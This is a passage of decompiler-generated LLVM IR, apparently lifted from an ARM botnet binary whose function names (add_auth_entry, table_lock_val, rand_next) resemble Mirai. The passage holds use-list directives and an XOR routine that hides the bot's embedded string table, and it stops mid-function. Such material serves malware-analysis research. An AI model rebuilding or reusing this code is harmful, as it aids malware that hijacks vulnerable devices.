  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), { 0, 7, 1, 2, 3, 8, 4, 9, 5, 10, 6, 11 }
  uselistorder i8* @global_var_23271.161, { 1, 0 }
  uselistorder i16* @global_var_23266.160, { 2, 1, 0 }
  uselistorder i32 5888, { 2, 3, 0, 4, 1, 5 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 0, 14, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 ptrtoint (i8** @global_var_23250.152 to i32), { 1, 0, 3, 2, 4, 7, 6, 5 }
  uselistorder i8* @global_var_23270.156, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 3, 2, 1, 0, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 9, 8, 7, 6, 5, 0, 4, 3, 1, 2 }
  uselistorder i32* @global_var_25d68.150, { 1, 2, 3, 4, 0 }
  uselistorder i32* @global_var_25d64.148, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_23280.136, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_25d48.57, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 14, 11, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_25d48.57 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10694.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10694.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %bb1974, { 1, 0 }
  uselistorder label %dec_label_pc_11204, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11120, { 1, 0 }
  uselistorder label %dec_label_pc_11010, { 0, 1, 2, 5, 3, 6, 7, 4 }
  uselistorder label %dec_label_pc_10fd8, { 1, 0 }
  uselistorder label %dec_label_pc_10fc4, { 0, 1, 2, 3, 6, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_10fb4, { 1, 0 }
  uselistorder label %dec_label_pc_10f00, { 0, 6, 1, 2, 3, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_10ee4, { 1, 0 }
  uselistorder label %dec_label_pc_10dd8, { 1, 0 }
  uselistorder label %dec_label_pc_10d2c, { 1, 0 }
  uselistorder label %thread-pre-split722, { 1, 0 }
  uselistorder label %dec_label_pc_10cdc, { 1, 0 }
  uselistorder label %.thread1199, { 5, 2, 3, 1, 4, 6, 0 }
  uselistorder label %dec_label_pc_10c60, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread714, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c2c, { 1, 0 }
  uselistorder label %.thread710, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c0c, { 1, 0 }
  uselistorder label %dec_label_pc_10bf8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10bb4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10b48, { 0, 6, 1, 2, 3, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_10b2c, { 1, 0 }
  uselistorder label %dec_label_pc_10a74, { 0, 6, 1, 2, 3, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_10a58, { 1, 0 }
  uselistorder label %dec_label_pc_109a0, { 0, 6, 1, 2, 3, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_10984, { 1, 0 }
  uselistorder label %dec_label_pc_108cc, { 0, 6, 1, 2, 3, 4, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_108b0, { 1, 0 }
  uselistorder label %dec_label_pc_10828, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10798, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb1936, { 1, 0 }
  uselistorder label %bb1934, { 1, 0 }
  uselistorder label %dec_label_pc_10760, { 1, 0 }
  uselistorder label %dec_label_pc_106f8, { 1, 0 }
  uselistorder label %.thread675, { 1, 0 }
  uselistorder label %dec_label_pc_106ac, { 1, 0 }
  uselistorder label %dec_label_pc_1069c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1069c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10678, { 1, 0 }
  uselistorder label %bb1930, { 1, 0 }
  uselistorder label %dec_label_pc_1059c, { 1, 0 }
  uselistorder label %bb1928, { 1, 0 }
  uselistorder label %bb1926, { 1, 0 }
  uselistorder label %bb1924, { 1, 0 }
  uselistorder label %bb1922, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_10490.dec_label_pc_10490_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1046c.dec_label_pc_1046c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10460, { 4, 0, 1, 2, 3 }
  uselistorder label %bb1920, { 1, 0 }
  uselistorder label %dec_label_pc_10440, { 1, 0 }
  uselistorder label %dec_label_pc_10418, { 1, 0 }
  uselistorder label %dec_label_pc_103f4, { 1, 0 }
  uselistorder label %dec_label_pc_102bc, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_102a8, { 1, 0 }
  uselistorder label %dec_label_pc_10198, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10178, { 1, 0 }
  uselistorder label %dec_label_pc_10164, { 1, 0 }
  uselistorder label %dec_label_pc_1014c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10128, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10104, { 1, 2, 0 }
  uselistorder label %thread-pre-split626, { 1, 0 }
  uselistorder label %bb1900, { 1, 0 }
  uselistorder label %dec_label_pc_100c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1009c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10078, { 2, 0, 3, 1 }
  uselistorder label %bb1891, { 1, 0 }
  uselistorder label %bb1889, { 1, 0 }
  uselistorder label %dec_label_pc_10044, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_10024, { 1, 2, 0, 3 }
  uselistorder label %bb1886, { 1, 0 }
  uselistorder label %dec_label_pc_10008, { 1, 0 }
  uselistorder label %thread-pre-split598, { 1, 0 }
  uselistorder label %bb1883, { 1, 0 }
  uselistorder label %thread-pre-split597, { 1, 0 }
  uselistorder label %bb1880, { 1, 0 }
  uselistorder label %thread-pre-split595, { 1, 0 }
  uselistorder label %bb1875, { 1, 0 }
  uselistorder label %thread-pre-split593, { 1, 0 }
  uselistorder label %bb1870, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ff38, { 1, 2, 0 }
  uselistorder label %thread-pre-split586, { 1, 0 }
  uselistorder label %bb1862, { 1, 0 }
  uselistorder label %dec_label_pc_fef4, { 2, 1, 3, 0 }
  uselistorder label %bb1859, { 1, 0 }
  uselistorder label %bb1857, { 1, 0 }
  uselistorder label %dec_label_pc_fecc, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_fea8, { 2, 0, 3, 1 }
  uselistorder label %bb1852, { 1, 0 }
  uselistorder label %bb1850, { 1, 0 }
  uselistorder label %dec_label_pc_fe74, { 2, 0, 3, 1 }
  uselistorder label %bb1847, { 1, 0 }
  uselistorder label %bb1845, { 1, 0 }
  uselistorder label %dec_label_pc_fe40, { 2, 1, 3, 0 }
  uselistorder label %bb1842, { 1, 0 }
  uselistorder label %bb1840, { 1, 0 }
  uselistorder label %dec_label_pc_fe18, { 2, 0, 3, 1 }
  uselistorder label %bb1836, { 1, 0 }
  uselistorder label %bb1834, { 1, 0 }
  uselistorder label %dec_label_pc_fde4, { 2, 0, 3, 1 }
  uselistorder label %bb1831, { 1, 0 }
  uselistorder label %bb1829, { 1, 0 }
  uselistorder label %dec_label_pc_fdb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fd94, { 2, 0, 3, 1 }
  uselistorder label %bb1825, { 1, 0 }
  uselistorder label %bb1823, { 1, 0 }
  uselistorder label %dec_label_pc_fd60, { 2, 0, 3, 1 }
  uselistorder label %bb1820, { 1, 0 }
  uselistorder label %bb1818, { 1, 0 }
  uselistorder label %dec_label_pc_fd2c, { 2, 0, 3, 1 }
  uselistorder label %bb1815, { 1, 0 }
  uselistorder label %bb1813, { 1, 0 }
  uselistorder label %dec_label_pc_fcfc, { 2, 0, 3, 1 }
  uselistorder label %bb1810, { 1, 0 }
  uselistorder label %bb1808, { 1, 0 }
  uselistorder label %dec_label_pc_fccc, { 1, 2, 0 }
  uselistorder label %bb1806, { 1, 0 }
  uselistorder label %bb1804, { 1, 0 }
  uselistorder label %dec_label_pc_fca4, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_fc80, { 1, 0, 2 }
  uselistorder label %bb1800, { 1, 0 }
  uselistorder label %bb1798, { 1, 0 }
  uselistorder label %dec_label_pc_fc58, { 2, 0, 3, 1 }
  uselistorder label %bb1795, { 1, 0 }
  uselistorder label %bb1793, { 1, 0 }
  uselistorder label %dec_label_pc_fc24, { 2, 0, 3, 1 }
  uselistorder label %bb1790, { 1, 0 }
  uselistorder label %bb1788, { 1, 0 }
  uselistorder label %dec_label_pc_fbf0, { 1, 2, 0 }
  uselistorder label %bb1786, { 1, 0 }
  uselistorder label %bb1784, { 1, 0 }
  uselistorder label %dec_label_pc_fbc4, { 1, 0 }
  uselistorder label %dec_label_pc_fbb8, { 1, 0 }
  uselistorder label %dec_label_pc_fb98, { 1, 0 }
  uselistorder label %dec_label_pc_fb80, { 1, 0 }
  uselistorder label %dec_label_pc_fb54, { 1, 0 }
  uselistorder label %dec_label_pc_fb48, { 1, 0 }
  uselistorder label %dec_label_pc_fb28, { 1, 0 }
  uselistorder label %dec_label_pc_faf0, { 1, 0 }
  uselistorder label %dec_label_pc_fae4, { 1, 0 }
  uselistorder label %dec_label_pc_facc, { 1, 0 }
  uselistorder label %dec_label_pc_fab8, { 1, 0 }
  uselistorder label %dec_label_pc_faa0, { 1, 0 }
  uselistorder label %dec_label_pc_fa88, { 1, 0, 2 }
  uselistorder label %bb1773, { 1, 0 }
  uselistorder label %bb1771, { 1, 0 }
  uselistorder label %dec_label_pc_fa54, { 2, 0, 3, 1 }
  uselistorder label %bb1766, { 1, 0 }
  uselistorder label %bb1764, { 1, 0 }
  uselistorder label %dec_label_pc_fa24, { 2, 1, 3, 0 }
  uselistorder label %bb1761, { 1, 0 }
  uselistorder label %bb1759, { 1, 0 }
  uselistorder label %dec_label_pc_f9f0, { 2, 1, 3, 0 }
  uselistorder label %bb1753, { 1, 0 }
  uselistorder label %bb1751, { 1, 0 }
  uselistorder label %dec_label_pc_f9c8, { 2, 1, 3, 0 }
  uselistorder label %bb1747, { 1, 0 }
  uselistorder label %bb1745, { 1, 0 }
  uselistorder label %dec_label_pc_f9a0, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_f97c, { 2, 0, 3, 1 }
  uselistorder label %bb1740, { 1, 0 }
  uselistorder label %bb1738, { 1, 0 }
  uselistorder label %dec_label_pc_f948, { 2, 0, 3, 1 }
  uselistorder label %bb1735, { 1, 0 }
  uselistorder label %bb1733, { 1, 0 }
  uselistorder label %dec_label_pc_f914, { 1, 0, 2 }
  uselistorder label %bb1730, { 1, 0 }
  uselistorder label %bb1728, { 1, 0 }
  uselistorder label %dec_label_pc_f8ec, { 1, 0, 2 }
  uselistorder label %bb1725, { 1, 0 }
  uselistorder label %bb1723, { 1, 0 }
  uselistorder label %dec_label_pc_f8c8, { 1, 0, 2 }
  uselistorder label %bb1720, { 1, 0 }
  uselistorder label %bb1718, { 1, 0 }
  uselistorder label %dec_label_pc_f8a0, { 2, 0, 3, 1 }
  uselistorder label %bb1715, { 1, 0 }
  uselistorder label %bb1713, { 1, 0 }
  uselistorder label %dec_label_pc_f870, { 1, 0 }
  uselistorder label %dec_label_pc_f858, { 1, 0 }
  uselistorder label %dec_label_pc_f840, { 1, 2, 0 }
  uselistorder label %bb1708, { 1, 0 }
  uselistorder label %bb1706, { 1, 0 }
  uselistorder label %dec_label_pc_f818, { 2, 0, 3, 1 }
  uselistorder label %bb1703, { 1, 0 }
  uselistorder label %bb1701, { 1, 0 }
  uselistorder label %bb1699, { 1, 0 }
  uselistorder label %dec_label_pc_f7b8, { 2, 1, 3, 0 }
  uselistorder label %bb1694, { 1, 0 }
  uselistorder label %bb1692, { 1, 0 }
  uselistorder label %dec_label_pc_f780, { 2, 0, 3, 1 }
  uselistorder label %bb1686, { 1, 0 }
  uselistorder label %dec_label_pc_f750, { 1, 2, 0 }
  uselistorder label %bb1684, { 1, 0 }
  uselistorder label %bb1682, { 1, 0 }
  uselistorder label %dec_label_pc_f724, { 2, 1, 3, 0 }
  uselistorder label %bb1679, { 1, 0 }
  uselistorder label %bb1677, { 1, 0 }
  uselistorder label %dec_label_pc_f6f0, { 1, 0, 2 }
  uselistorder label %bb1671, { 1, 0 }
  uselistorder label %bb1669, { 1, 0 }
  uselistorder label %dec_label_pc_f6bc, { 2, 0, 3, 1 }
  uselistorder label %bb1664, { 1, 0 }
  uselistorder label %bb1662, { 1, 0 }
  uselistorder label %dec_label_pc_f688, { 2, 0, 3, 1 }
  uselistorder label %bb1659, { 1, 0 }
  uselistorder label %dec_label_pc_f658, { 1, 2, 0 }
  uselistorder label %bb1657, { 1, 0 }
  uselistorder label %bb1655, { 1, 0 }
  uselistorder label %dec_label_pc_f62c, { 1, 2, 0 }
  uselistorder label %bb1653, { 1, 0 }
  uselistorder label %bb1651, { 1, 0 }
  uselistorder label %dec_label_pc_f604, { 2, 1, 3, 0 }
  uselistorder label %bb1648, { 1, 0 }
  uselistorder label %bb1646, { 1, 0 }
  uselistorder label %dec_label_pc_f5d0, { 2, 1, 3, 0 }
  uselistorder label %bb1640, { 1, 0 }
  uselistorder label %dec_label_pc_f5a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f588, { 2, 0, 3, 1 }
  uselistorder label %bb1633, { 1, 0 }
  uselistorder label %bb1631, { 1, 0 }
  uselistorder label %dec_label_pc_f554, { 2, 0, 3, 1 }
  uselistorder label %bb1628, { 1, 0 }
  uselistorder label %bb1626, { 1, 0 }
  uselistorder label %dec_label_pc_f520, { 1, 2, 0 }
  uselistorder label %bb1624, { 1, 0 }
  uselistorder label %dec_label_pc_f4fc, { 2, 1, 3, 0 }
  uselistorder label %bb1621, { 1, 0 }
  uselistorder label %dec_label_pc_f4d8, { 1, 0, 2 }
  uselistorder label %bb1617, { 1, 0 }
  uselistorder label %bb1615, { 1, 0 }
  uselistorder label %dec_label_pc_f4a8, { 1, 2, 0 }
  uselistorder label %bb1611, { 1, 0 }
  uselistorder label %bb1609, { 1, 0 }
  uselistorder label %dec_label_pc_f460, { 1, 0 }
  uselistorder label %dec_label_pc_f420, { 1, 0 }
  uselistorder label %dec_label_pc_f408, { 1, 0 }
  uselistorder label %dec_label_pc_f3ac, { 1, 0 }
  uselistorder label %dec_label_pc_f394, { 1, 0 }
  uselistorder label %dec_label_pc_f380, { 1, 0 }
  uselistorder label %dec_label_pc_f368, { 1, 0 }
  uselistorder label %thread-pre-split212, { 1, 0 }
  uselistorder label %bb1591, { 1, 0 }
  uselistorder label %dec_label_pc_f308, { 1, 2, 0 }
  uselistorder label %thread-pre-split207, { 1, 0 }
  uselistorder label %bb1588, { 1, 0 }
  uselistorder label %thread-pre-split205, { 1, 0 }
  uselistorder label %bb1583, { 1, 0 }
  uselistorder label %thread-pre-split204, { 1, 0 }
  uselistorder label %bb1580, { 1, 0 }
  uselistorder label %thread-pre-split203, { 1, 0 }
  uselistorder label %bb1577, { 1, 0 }
  uselistorder label %thread-pre-split201, { 1, 0 }
  uselistorder label %bb1572, { 1, 0 }
  uselistorder label %dec_label_pc_f200, { 1, 2, 0 }
  uselistorder label %thread-pre-split195, { 1, 0 }
  uselistorder label %bb1566, { 1, 0 }
  uselistorder label %thread-pre-split193, { 1, 0 }
  uselistorder label %bb1561, { 1, 0 }
  uselistorder label %thread-pre-split191, { 1, 0 }
  uselistorder label %bb1556, { 1, 0 }
  uselistorder label %thread-pre-split190, { 1, 0 }
  uselistorder label %bb1553, { 1, 0 }
  uselistorder label %thread-pre-split189, { 1, 0 }
  uselistorder label %bb1550, { 1, 0 }
  uselistorder label %dec_label_pc_f104, { 1, 2, 0 }
  uselistorder label %thread-pre-split183, { 1, 0 }
  uselistorder label %bb1544, { 1, 0 }
  uselistorder label %thread-pre-split182, { 1, 0 }
  uselistorder label %bb1541, { 1, 0 }
  uselistorder label %thread-pre-split181, { 1, 0 }
  uselistorder label %bb1538, { 1, 0 }
  uselistorder label %thread-pre-split180, { 1, 0 }
  uselistorder label %bb1535, { 1, 0 }
  uselistorder label %thread-pre-split179, { 1, 0 }
  uselistorder label %bb1532, { 1, 0 }
  uselistorder label %bb1530, { 1, 0 }
  uselistorder label %bb1528, { 1, 0 }
  uselistorder label %thread-pre-split178, { 1, 0 }
  uselistorder label %bb1525, { 1, 0 }
  uselistorder label %dec_label_pc_f000, { 1, 2, 0 }
  uselistorder label %dec_label_pc_efdc, { 1, 2, 0 }
  uselistorder label %bb1520, { 1, 0 }
  uselistorder label %bb1518, { 1, 0 }
  uselistorder label %dec_label_pc_efb0, { 1, 2, 0 }
  uselistorder label %bb1515, { 1, 0 }
  uselistorder label %thread-pre-split167, { 1, 0 }
  uselistorder label %bb1512, { 1, 0 }
  uselistorder label %thread-pre-split165, { 1, 0 }
  uselistorder label %bb1507, { 1, 0 }
  uselistorder label %dec_label_pc_ef28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ef04, { 1, 2, 0 }
  uselistorder label %bb1500, { 1, 0 }
  uselistorder label %bb1498, { 1, 0 }
  uselistorder label %dec_label_pc_eedc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_eec0, { 1, 2, 0 }
  uselistorder label %bb1496, { 1, 0 }
  uselistorder label %bb1494, { 1, 0 }
  uselistorder label %dec_label_pc_ee98, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ee74, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ee50, { 1, 2, 0 }
  uselistorder label %bb1486, { 1, 0 }
  uselistorder label %bb1484, { 1, 0 }
  uselistorder label %thread-pre-split132, { 1, 0 }
  uselistorder label %bb1481, { 1, 0 }
  uselistorder label %thread-pre-split131, { 1, 0 }
  uselistorder label %bb1478, { 1, 0 }
  uselistorder label %dec_label_pc_edac, { 1, 2, 0 }
  uselistorder label %bb1469, { 1, 0 }
  uselistorder label %bb1467, { 1, 0 }
  uselistorder label %bb1465, { 1, 0 }
  uselistorder label %bb1463, { 1, 0 }
  uselistorder label %dec_label_pc_ed4c, { 1, 0 }
  uselistorder label %dec_label_pc_ed30, { 1, 0 }
  uselistorder label %dec_label_pc_ed14, { 1, 0 }
  uselistorder label %dec_label_pc_ecfc, { 1, 0 }
  uselistorder label %dec_label_pc_eca4, { 1, 0 }
  uselistorder label %dec_label_pc_ec88, { 1, 0 }
  uselistorder label %dec_label_pc_ec6c, { 1, 0 }
  uselistorder label %dec_label_pc_ec50, { 1, 0 }
  uselistorder label %dec_label_pc_ec00, { 1, 0 }
  uselistorder label %dec_label_pc_ebe4, { 1, 0 }
  uselistorder label %dec_label_pc_ebd8, { 1, 0 }
  uselistorder label %dec_label_pc_ebbc, { 1, 0 }
  uselistorder label %dec_label_pc_eba4, { 1, 0 }
  uselistorder label %dec_label_pc_eb84, { 1, 0 }
  uselistorder label %dec_label_pc_eb40, { 1, 0 }
  uselistorder label %dec_label_pc_eb34, { 1, 0 }
  uselistorder label %dec_label_pc_eadc, { 1, 0 }
  uselistorder label %dec_label_pc_eaa8, { 1, 0 }
  uselistorder label %dec_label_pc_ea94, { 1, 0 }
  uselistorder label %dec_label_pc_ea80, { 1, 0 }
  uselistorder label %dec_label_pc_ea58, { 1, 0 }
  uselistorder label %dec_label_pc_ea44, { 1, 0 }
  uselistorder label %dec_label_pc_ea30, { 1, 0 }
  uselistorder label %dec_label_pc_ea18, { 1, 0 }
  uselistorder label %dec_label_pc_e9fc, { 1, 0 }
  uselistorder label %dec_label_pc_e9a8, { 1, 0 }
  uselistorder label %dec_label_pc_e990, { 1, 0 }
  uselistorder label %bb1370, { 1, 0 }
  uselistorder label %dec_label_pc_e8d0, { 11, 117, 0, 12, 118, 119, 13, 120, 121, 14, 122, 123, 124, 125, 15, 126, 16, 17, 127, 128, 18, 129, 19, 130, 131, 132, 20, 133, 21, 22, 23, 24, 25, 134, 26, 27, 28, 29, 30, 135, 31, 32, 33, 34, 136, 35, 36, 137, 37, 38, 138, 39, 40, 41, 42, 43, 139, 44, 45, 46, 47, 48, 49, 50, 51, 52, 140, 53, 54, 55, 56, 57, 58, 59, 141, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 142, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 180, 181, 91, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 92, 197, 198, 199, 93, 200, 201, 202, 203, 94, 204, 95, 96, 205, 206, 207, 97, 98, 99, 208, 209, 210, 100, 101, 102, 211, 103, 212, 104, 105, 106, 213, 107, 108, 109, 110, 111, 112, 113, 163, 164, 165, 114, 115, 116, 166, 167, 168, 169, 1, 170, 2, 171, 3, 172, 4, 173, 5, 174, 6, 175, 7, 176, 8, 177, 9, 178, 10, 179, 214 }
  uselistorder label %dec_label_pc_e630, { 1, 2, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_25d74.235 to i32), i32* @r2, align 4
  %v3_11394 = mul i32 %arg1, 8
  %v2_11398 = add i32 %v3_11394, ptrtoint (i32* @global_var_25d74.235 to i32)
  store i32 %v2_11398, i32* @r3, align 4
  %v2_1139c = icmp eq i32* %arg2, null
  br i1 %v2_1139c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_113a44 = inttoptr i32 %v2_11398 to i32*
  %v4_113a45 = load i32, i32* %v3_113a44, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_113a0 = add i32 %v3_11394, add (i32 ptrtoint (i32* @global_var_25d74.235 to i32), i32 4)
  %v3_113a0 = inttoptr i32 %v2_113a0 to i16*
  %v4_113a0 = load i16, i16* %v3_113a0, align 4
  %v5_113a0 = zext i16 %v4_113a0 to i32
  store i32 %v5_113a0, i32* @r3, align 4
  %v3_113a4 = inttoptr i32 %v2_11398 to i32*
  %v4_113a4 = load i32, i32* %v3_113a4, align 4
  store i32 %v5_113a0, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_113a46 = phi i32 [ %v4_113a45, %.thread ], [ %v4_113a4, %bb ]
  ret i32 %v4_113a46

; uselistorder directives
  uselistorder i32 %v2_11398, { 1, 0, 2 }
  uselistorder i32 %v3_11394, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_113bc = mul i32 %arg1, 8
  %v2_113c0 = add i32 %v3_113bc, ptrtoint (i32* @global_var_25d74.235 to i32)
  %v2_113c4 = load i32, i32* @global_var_230c4.238, align 4
  store i32 %v2_113c4, i32* @r1, align 4
  %v1_113c8 = add i32 %v3_113bc, add (i32 ptrtoint (i32* @global_var_25d74.235 to i32), i32 4)
  %v2_113c8 = inttoptr i32 %v1_113c8 to i16*
  %v3_113c8 = load i16, i16* %v2_113c8, align 4
  %v3_113cc = udiv i32 %v2_113c4, 256
  %v2_113d0 = icmp eq i16 %v3_113c8, 0
  store i1 %v2_113d0, i1* @cpsr_z, align 1
  %v3_113d4 = udiv i32 %v2_113c4, 65536
  store i32 %v3_113d4, i32* @r3, align 4
  %v3_113d8 = load i32, i32* @r4, align 4
  store i32 %v3_113d8, i32* %stack_var_-16, align 4
  %v1_113dc = urem i32 %v3_113cc, 256
  store i32 %v1_113dc, i32* %r6.global-to-local, align 4
  %v1_113e0 = urem i32 %v3_113d4, 256
  store i32 %v1_113e0, i32* %r5.global-to-local, align 4
  %v3_113e4 = udiv i32 %v2_113c4, 16777216
  store i32 %v3_113e4, i32* %r4.global-to-local, align 4
  %v1_113e8 = urem i32 %v2_113c4, 256
  store i32 %v1_113e8, i32* %lr.global-to-local, align 4
  br i1 %v2_113d0, label %dec_label_pc_11444, label %dec_label_pc_113f0

dec_label_pc_113f0:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_113f4 = inttoptr i32 %v2_113c0 to i32*
  br label %dec_label_pc_113f4

dec_label_pc_113f4:                               ; preds = %dec_label_pc_113f4.dec_label_pc_113f4_crit_edge, %dec_label_pc_113f0
  %v0_113fc = phi i32 [ %v0_113fc.pre, %dec_label_pc_113f4.dec_label_pc_113f4_crit_edge ], [ %v1_113e8, %dec_label_pc_113f0 ]
  %v2_11400 = phi i32 [ %v1_11438, %dec_label_pc_113f4.dec_label_pc_113f4_crit_edge ], [ 0, %dec_label_pc_113f0 ]
  %v2_113f4 = load i32, i32* %v1_113f4, align 4
  %v2_113f8 = add i32 %v2_113f4, %v2_11400
  %v3_113f8 = inttoptr i32 %v2_113f8 to i8*
  %v4_113f8 = load i8, i8* %v3_113f8, align 1
  %v6_113f8 = zext i8 %v4_113f8 to i32
  %v2_113fc = xor i32 %v6_113f8, %v0_113fc
  %v1_11400 = trunc i32 %v2_113fc to i8
  store i8 %v1_11400, i8* %v3_113f8, align 1
  %v2_11404 = load i32, i32* %v1_113f4, align 4
  %v0_11408 = load i32, i32* @ip, align 4
  %v2_11408 = add i32 %v0_11408, %v2_11404
  %v3_11408 = inttoptr i32 %v2_11408 to i8*
  %v4_11408 = load i8, i8* %v3_11408, align 1
  %v6_11408 = zext i8 %v4_11408 to i32
  %v0_1140c = load i32, i32* %r6.global-to-local, align 4
  %v2_1140c = xor i32 %v0_1140c, %v6_11408
  %v1_11410 = trunc i32 %v2_1140c to i8
  store i8 %v1_11410, i8* %v3_11408, align 1
  %v2_11414 = load i32, i32* %v1_113f4, align 4
  %v0_11418 = load i32, i32* @ip, align 4
  %v2_11418 = add i32 %v0_11418, %v2_11414
  %v3_11418 = inttoptr i32 %v2_11418 to i8*
  %v4_11418 = load i8, i8* %v3_11418, align 1
  %v6_11418 = zext i8 %v4_11418 to i32
  %v0_1141c = load i32, i32* %r5.global-to-local, align 4
  %v2_1141c = xor i32 %v0_1141c, %v6_11418
  %v1_11420 = trunc i32 %v2_1141c to i8
  store i8 %v1_11420, i8* %v3_11418, align 1
  %v2_11424 = load i32, i32* %v1_113f4, align 4
  store i32 %v2_11424, i32* @r1, align 4
  %v0_11428 = load i32, i32* @ip, align 4
  %v2_11428 = add i32 %v0_11428, %v2_11424
  %v3_11428 = inttoptr i32 %v2_11428 to i8*
  %v4_11428 = load i8, i8* %v3_11428, align 1
  %v6_11428 = zext i8 %v4_11428 to i32
  %v0_1142c = load i32, i32* %r4.global-to-local, align 4
  %v2_1142c = xor i32 %v0_1142c, %v6_11428
  store i32 %v2_1142c, i32* @r3, align 4
  %v1_11430 = trunc i32 %v2_1142c to i8
  store i8 %v1_11430, i8* %v3_11428, align 1
  %v3_11434 = load i16, i16* %v2_113c8, align 4
  %v4_11434 = zext i16 %v3_11434 to i32
  %v0_11438 = load i32, i32* @ip, align 4
  %v1_11438 = add i32 %v0_11438, 1
  store i32 %v1_11438, i32* @ip, align 4
  %v9_1143c = icmp eq i32 %v4_11434, %v1_11438
  store i1 %v9_1143c, i1* @cpsr_z, align 1
  %v8_11440 = icmp sgt i32 %v4_11434, %v1_11438
  br i1 %v8_11440, label %dec_label_pc_113f4.dec_label_pc_113f4_crit_edge, label %dec_label_pc_11444.loopexit

dec_label_pc_113f4.dec_label_pc_113f4_crit_edge:  ; preds = %dec_label_pc_113f4
  %v0_113fc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_113f4

dec_label_pc_11444.loopexit:                      ; preds = %dec_label_pc_113f4
  %v2_11444.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11444

dec_label_pc_11444:                               ; preds = %dec_label_pc_11444.loopexit, %entry
  %v2_11444 = phi i32 [ %v2_11444.pre, %dec_label_pc_11444.loopexit ], [ %v3_113d8, %entry ]
